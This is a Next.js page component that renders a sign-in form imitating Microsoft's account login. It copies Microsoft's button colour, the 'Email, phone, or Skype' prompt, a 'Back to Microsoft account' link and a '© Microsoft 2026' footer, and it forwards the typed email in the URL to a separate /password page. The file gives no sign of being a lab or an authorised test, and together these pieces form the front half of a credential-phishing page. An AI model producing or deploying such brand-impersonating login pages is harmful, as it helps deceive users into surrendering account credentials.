"use client";

import { useState } from 'react';
import Link from 'next/link';

export default function Home() {
  const [email, setEmail] = useState('');

  return (
    <main className="min-h-screen flex flex-col items-center justify-center px-4 relative overflow-hidden">
      {/* Animated gradient background */}
      <div className="absolute inset-0 bg-gradient-to-br from-blue-900 via-purple-900 to-slate-900"></div>
      <div className="absolute inset-0 bg-gradient-to-tr from-cyan-500/20 via-transparent to-pink-500/20"></div>
      {/* Floating orbs for visual interest */}
      <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-blue-500/30 rounded-full blur-3xl"></div>
      <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-purple-500/30 rounded-full blur-3xl"></div>
      <div className="absolute top-1/2 right-1/3 w-64 h-64 bg-cyan-400/20 rounded-full blur-3xl"></div>

      {/* Content with frosted glass effect */}
      <div className="relative z-10 w-full max-w-[440px] p-8 rounded-2xl bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl">
        <h1 className="text-2xl font-semibold text-white mb-6">Sign in</h1>
        
        <form className="space-y-4" onSubmit={(e) => e.preventDefault()}>
          <div>
            <label 
              htmlFor="email" 
              className="block text-sm text-gray-200 mb-1"
            >
              Email, phone, or Skype
            </label>
            <input
              id="email"
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-3 py-2.5 border border-white/30 rounded bg-white/20 backdrop-blur-sm focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400 text-base text-white placeholder-gray-400"
              autoComplete="off"
            />
          </div>

          <div className="pt-2">
            <Link
              href={`/password?email=${encodeURIComponent(email)}`}
              className="inline-block w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors text-center"
            >
              Next
            </Link>
          </div>
        </form>

        <div className="mt-4 text-center">
          <a 
            href="#" 
            className="text-sm text-cyan-300 hover:underline"
          >
            Can&#39;t access your account?
          </a>
        </div>
      </div>

        <div className="mt-6">
        <a 
          href="#" 
          className="text-sm text-gray-300 hover:underline flex items-center gap-1"
        >
          <svg 
            width="12" 
            height="12" 
            viewBox="0 0 12 12" 
            fill="currentColor"
          >
            <path d="M10.5 6L6 1.5L1.5 6" stroke="currentColor" strokeWidth="1.5" fill="none"/>
          </svg>
          Back to Microsoft account
        </a>
      </div>

      {/* Footer Links */}
      <footer className="fixed bottom-0 left-0 right-0 bg-white/5 backdrop-blur-sm border-t border-white/10">
        <div className="max-w-[940px] mx-auto px-4 py-4 flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-400">
          <a href="#" className="hover:underline">Privacy and cookies</a>
          <a href="#" className="hover:underline">Terms of use</a>
          <a href="#" className="hover:underline">© Microsoft 2026</a>
        </div>
      </footer>
    </main>
  );
}
